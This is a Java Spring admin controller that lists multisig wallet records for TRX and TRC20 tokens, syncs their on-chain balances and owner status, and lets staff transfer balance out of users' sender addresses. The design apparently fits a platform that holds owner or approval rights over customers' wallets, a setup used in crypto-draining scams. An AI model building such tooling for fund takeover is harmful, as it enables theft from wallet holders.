package com.inso.modules.admin.agent.controller.coin;

import com.inso.framework.bean.ApiJsonTemplate;
import com.inso.framework.bean.ErrorResult;
import com.inso.framework.bean.PageVo;
import com.inso.framework.bean.SystemErrorResult;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.spring.web.WebRequest;
import com.inso.framework.utils.RowPager;
import com.inso.modules.admin.agent.AgentAuthManager;
import com.inso.modules.admin.core.model.AdminSecret;
import com.inso.modules.admin.core.service.AdminService;
import com.inso.modules.admin.helper.AdminAccountHelper;
import com.inso.modules.admin.helper.AgentAccountHelper;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.coin.contract.MutisignManager;
import com.inso.modules.coin.contract.NativeTokenManager;
import com.inso.modules.coin.contract.Token20Manager;
import com.inso.modules.coin.core.logical.MutisignTransferOrderManager;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.core.service.MutiSignService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.common.model.Status;
import com.inso.modules.passport.UserErrorResult;
import com.inso.modules.passport.user.logical.UserQueryManager;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.model.UserInfo;
import com.inso.modules.passport.user.service.UserAttrService;
import com.inso.modules.passport.user.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.math.BigDecimal;

@Controller
@RequestMapping("/alibaba888/agent")
public class MutisignController {

    private static Log LOG = LogFactory.getLog(MutisignController.class);

    @Autowired
    private UserService userService;

    @Autowired
    private UserAttrService mUserAttrService;

    @Autowired
    private ApproveAuthService mApproveAuthService;

    @Autowired
    private UserQueryManager mUserQueryManager;

    @Autowired
    private MutisignTransferOrderManager mTransferOrderMgr;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private UserService mUserService;

    @Autowired
    private AdminService mAdminService;

    @Autowired
    private MutiSignService mutiSignService;

    @Autowired
    private AgentAuthManager mAgentAuthManager;


    @RequestMapping("root_coin_mutisign_record")
    public String toList(Model model, HttpServletRequest request)
    {
        model.addAttribute("isAgent", AgentAccountHelper.isAgentLogin() + "");
        return "admin/agent/coin/coin_mutisign_list";
    }

    @RequestMapping("getCoinMutisignRecordList")
    @ResponseBody
    public String getCoinMutisignRecordList()
    {
        String time = WebRequest.getString("time");

        CryptoCurrency currency = CryptoCurrency.getType(WebRequest.getString("currencyType"));

        String username = WebRequest.getString("username");
        long userid = mUserQueryManager.findUserid(username);

        long agentid = AgentAccountHelper.getAdminAgentid();
        long staffid = -1;

        if(AgentAccountHelper.isAgentLogin())
        {

            String staffname = WebRequest.getString("staffname");
            staffid = mUserQueryManager.findUserid(staffname);
        }
        else
        {

            staffid = AgentAccountHelper.getAdminLoginInfo().getId();
        }


        Status status = Status.getType(WebRequest.getString("status"));
        ApiJsonTemplate template = new ApiJsonTemplate();

        if(userid > 0 && !mAgentAuthManager.verifyUserData(userid))
        {
            template.setData(RowPager.getEmptyRowPager());
            return template.toJSONString();
        }

        PageVo pageVo = new PageVo(WebRequest.getInt("offset"), WebRequest.getInt("limit"));
        pageVo.parseTime(time);

        RowPager<MutisignInfo> rowPager = mutiSignService.queryScrollPage(pageVo, userid, currency, status,agentid,staffid );
        template.setData(rowPager);
        return template.toJSONString();
    }

    @RequestMapping("doCoinMutisignTransferBalance")
    @ResponseBody
    public String doCoinMutisignTransferBalance()
    {
        long id = WebRequest.getLong("transferFormId");
        String googleCode = WebRequest.getString("transferFormGoogleCode");
        BigDecimal transferAmount = WebRequest.getBigDecimal("transferFormAmount");

        boolean forceTransfer = WebRequest.getBoolean("transferFromForceTransfer");

        ApiJsonTemplate template = new ApiJsonTemplate();

        if(transferAmount.compareTo(BigDecimal.ZERO) <= 0 || id <= 0)
        {
            template.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return template.toJSONString();
        }

        AdminSecret adminSecret = mAdminService.findAdminSecretByID(AdminAccountHelper.getAdmin().getAccount());
        if(! adminSecret.checkGoogleCode(googleCode))
        {
            template.setJsonResult(SystemErrorResult.ERR_SYS_GOOGLE);
            return template.toJSONString();
        }

        MutisignInfo authInfo = mutiSignService.findById(id);
        if(authInfo == null)
        {
            template.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return template.toJSONString();
        }
        if(authInfo.getBalance().compareTo(BigDecimal.ZERO) <= 0 || transferAmount.compareTo(authInfo.getBalance()) > 0)
        {
            template.setJsonResult(UserErrorResult.ERR_PAY_NOT_ENOUGH_BALANCE);
            return template.toJSONString();
        }

        if(authInfo.getUserid() > 0 && !mAgentAuthManager.verifyUserData(authInfo.getUserid()))
        {
            template.setData(RowPager.getEmptyRowPager());
            return template.toJSONString();
        }

        UserInfo userInfo = userService.findByUsername(false, authInfo.getUsername());
        UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
        if(userType == UserInfo.UserType.TEST)
        {
            template.setError(SystemErrorResult.ERR_CUSTOM.getCode(), "测试号无法划转!");
            return template.toJSONString();
        }

        UserAttr userAttr = mUserAttrService.find(false, authInfo.getUserid());

        // 创建订单
        ErrorResult result = mTransferOrderMgr.createOrder(userAttr, authInfo, transferAmount, TriggerOperatorType.Admin);
        template.setJsonResult(result);

        return template.toJSONString();
    }


    @RequestMapping("syncCoinMutisignInfo")
    @ResponseBody
    public String syncCoinMutisignInfo()
    {
        long id = WebRequest.getLong("id");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        MutisignInfo enttiInfo = mutiSignService.findById(id);
        if(enttiInfo == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
            return apiJsonTemplate.toJSONString();
        }

        if(!mAgentAuthManager.verifyUserData(enttiInfo.getUserid()))
        {
            apiJsonTemplate.setData(RowPager.getEmptyRowPager());
            return apiJsonTemplate.toJSONString();
        }

//        UserInfo userInfo = mUserService.findByUsername(false, enttiInfo.getUsername());

        CryptoNetworkType networkType = CryptoNetworkType.getType(enttiInfo.getNetworkType());
        CryptoCurrency currency = CryptoCurrency.getType(enttiInfo.getCurrencyType());
        String address = enttiInfo.getSenderAddress();

        Status status = null;
        BigDecimal balance = null;
        if(currency == CryptoCurrency.TRX)
        {
            balance = NativeTokenManager.getInstance().getBalance(networkType, address);
            status = MutisignManager.getInstance().verifyExistOwner(networkType, address);

        }
        else
        {
            TokenAssertInfo tokenAssertInfo = TokenAssertConfig.getTokenInfo(networkType, currency);
            balance = Token20Manager.getInstance().balanceOf(networkType, tokenAssertInfo.getContractAddress(), address);
        }

        if(balance == null || balance.compareTo(enttiInfo.getBalance()) == 0)
        {
            balance = null;
        }

        if(balance != null)
        {
            mutiSignService.updateInfo(enttiInfo, balance, null);
        }

        if(status != null)
        {
            mutiSignService.updateStatus(address, status);
        }

        return apiJsonTemplate.toJSONString();
    }




}
